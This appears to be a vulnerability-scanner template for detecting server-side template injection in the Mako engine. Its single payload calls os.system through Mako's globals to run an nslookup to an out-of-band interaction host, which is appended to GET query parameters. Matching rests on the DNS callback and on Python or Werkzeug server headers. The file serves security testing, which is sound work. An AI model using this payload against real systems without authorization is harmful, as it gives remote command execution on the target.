id: mako-oob

info:
  name: Mako - Out of Band Template Injection
  author: 0xAwali,DhiyaneshDK
  severity: unknown
  reference:
    - https://www.makotemplates.org/
    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  metadata:
    verified: true
  tags: ssti,dast,oast,oob

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        - "${self.__init__.__globals__['util'].os.system('nslookup+{{interactsh-url}}')}"

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"

    skip-variables-check: true

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: word
        part: server
        words:
          - "Werkzeug"
          - "Python"